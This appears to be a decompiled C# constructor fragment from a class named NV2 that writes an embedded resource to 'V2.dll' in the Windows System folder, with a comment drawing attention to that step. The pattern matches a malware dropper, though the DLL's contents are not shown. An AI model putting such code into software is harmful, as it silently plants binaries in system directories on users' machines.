        public NV2()
        {
            List<WeakReference> _ENCList = NV2.__ENCList;
            Monitor.Enter(_ENCList);
            try
            {
                NV2.__ENCList.Add(new WeakReference(this));
            }
            finally
            {
                Monitor.Exit(_ENCList);
            }
            //Here comes the part that writes the resources
            FileStream fileStream = new FileStream(string.Concat(Environment.GetFolderPath(Environment.SpecialFolder.System), "\\V2.dll"), FileMode.OpenOrCreate);
            fileStream.Write(Resources.V2, 0, checked((int)Resources.V2.Length));
            fileStream.Close();
        }
